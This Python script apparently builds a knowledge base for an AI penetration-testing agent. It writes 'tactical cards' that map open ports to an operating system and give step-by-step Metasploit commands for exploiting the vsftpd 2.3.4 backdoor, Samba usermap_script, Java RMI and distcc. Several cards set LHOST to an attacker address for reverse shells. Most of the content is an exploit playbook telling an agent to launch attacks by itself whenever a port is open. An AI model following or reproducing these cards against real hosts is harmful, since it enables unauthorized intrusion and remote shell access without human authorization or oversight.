# -*- coding: utf-8 -*-
import os
import sys

def format_tactical_card(name, keywords, description, instructions):
    """Gera um card de doutrina/estrategia para a IA"""
    return f"""
=== TACTICAL KNOWLEDGE CARD ===
NAME: manual/tactic/{name}
TYPE: strategy
KEYWORDS: {keywords}
DESCRIPTION: {description.strip()}
INSTRUCTIONS:
{instructions.strip()}
USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
===============================
"""

def main():
    print("[DB_03] === GERADOR DE DOUTRINA TATICA (MANUAL) ===")
    
    tactics = []

    # --- CARD 1: Identificacao de SO via Portas ---
    tactics.append(format_tactical_card(
        name="os_fingerprinting_by_port",
        keywords="recon os detection windows linux unix port mapping",
        description="How to guess the Operating System based on open ports.",
        instructions="""
        IF Port 445 (SMB) is OPEN -> Target is likely WINDOWS.
        IF Port 139 (NetBIOS) is OPEN -> Target is likely WINDOWS.
        IF Port 3389 (RDP) is OPEN -> Target is likely WINDOWS.
        IF Port 22 (SSH) is OPEN -> Target is likely LINUX or UNIX.
        IF Port 111 (RPC) is OPEN -> Target is likely LINUX or UNIX.
        IF Port 2049 (NFS) is OPEN -> Target is likely LINUX or UNIX.
        
        DECISION LOGIC:
        - If targeting Windows ports, prioritize 'exploit/windows/...' modules.
        - If targeting Linux ports, prioritize 'exploit/linux/...' or 'exploit/unix/...' modules.
        """
    ))

    # --- CARD 2: Guia de Exploracao FTP (vsftpd) ---
    tactics.append(format_tactical_card(
        name="attack_guide_ftp_vsftpd",
        keywords="ftp port 21 vsftpd backdoor exploit guide",
        description="Tactical guide for attacking vsftpd 2.3.4 on Port 21.",
        instructions="""
        TRIGGER: If Port 21 is OPEN and service banner contains "vsftpd 2.3.4".
        RECOMMENDED MODULE: exploit/unix/ftp/vsftpd_234_backdoor
        
        CONFIGURATION STEPS:
        1. use exploit/unix/ftp/vsftpd_234_backdoor
        2. set RHOSTS <TARGET_IP>
        3. set RPORT 21
        4. set UNKNOWN_CONNECTION_ERROR true (optional, helps connectivity)
        5. exploit
        
        NOTE: This module opens a shell instantly. No complex payload needed.
        """
    ))

    # --- CARD 3: Guia de Exploracao Samba (Port 139/445) ---
    tactics.append(format_tactical_card(
        name="attack_guide_samba_usermap",
        keywords="samba smb port 139 port 445 usermap script exploit guide linux",
        description="Tactical guide for attacking old Samba versions on Linux.",
        instructions="""
        TRIGGER: If Port 139 or 445 is OPEN and OS seems to be Linux/Unix.
        RECOMMENDED MODULE: exploit/multi/samba/usermap_script
        
        CONFIGURATION STEPS:
        1. use exploit/multi/samba/usermap_script
        2. set RHOSTS <TARGET_IP>
        3. set RPORT 139 (or 445)
        4. set LHOST <ATTACKER_IP>
        5. set LPORT 4444
        6. exploit
        """
    ))

    # --- CARD 4: Guia de Exploracao Java RMI (Port 1099) ---
    tactics.append(format_tactical_card(
        name="attack_guide_java_rmi",
        keywords="java rmi port 1099 metasploitable exploit guide",
        description="Tactical guide for attacking Java RMI Server.",
        instructions="""
        TRIGGER: If Port 1099 is OPEN.
        RECOMMENDED MODULE: exploit/multi/misc/java_rmi_server
        
        CONFIGURATION STEPS:
        1. use exploit/multi/misc/java_rmi_server
        2. set RHOSTS <TARGET_IP>
        3. set RPORT 1099
        4. set LHOST <ATTACKER_IP>
        5. set LPORT 4444
        6. exploit
        """
    ))

    # --- CARD 5: Guia de Exploracao DistCC (Port 3632) ---
    tactics.append(format_tactical_card(
        name="attack_guide_distcc",
        keywords="distcc port 3632 compilation exploit guide",
        description="Tactical guide for attacking Distributed Compiler Daemon.",
        instructions="""
        TRIGGER: If Port 3632 is OPEN.
        RECOMMENDED MODULE: exploit/unix/misc/distcc_exec
        
        CONFIGURATION STEPS:
        1. use exploit/unix/misc/distcc_exec
        2. set RHOSTS <TARGET_IP>
        3. set RPORT 3632
        4. set LHOST <ATTACKER_IP>
        5. set LPORT 4444
        6. set PAYLOAD cmd/unix/reverse (often more stable)
        7. exploit
        """
    ))
    
    # --- CARD 6: Como Pesquisar (Generalizacao) ---
    tactics.append(format_tactical_card(
        name="general_module_selection_logic",
        keywords="how to choose module matching logic",
        description="Rules for matching modules to targets.",
        instructions="""
        1. OS MATCH: Never run a 'windows' exploit against a target with Port 22 (SSH) unless you are sure.
        2. SERVICE MATCH: Check the port. Port 21 is FTP. Port 22 is SSH. Port 23 is Telnet. Port 80 is HTTP. Port 445 is SMB.
        3. MODULE PATH: The path tells you the OS. 
           - exploit/WINDOWS/... -> Only for Windows.
           - exploit/LINUX/... -> Only for Linux.
           - exploit/UNIX/... -> Generic Unix/Linux.
           - exploit/MULTI/... -> Works on multiple OS (check options).
        """
    ))

    # Salva no arquivo de ingestao
    output_path = "/app/config/ingest/kb_tactical.txt"
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(tactics))
        
    print(f"[DB_03] [SUCESSO] Gerados {len(tactics)} Cards Taticos.")
    print(f"[DB_03] [OUTPUT] {output_path}")

if __name__ == "__main__":
    main()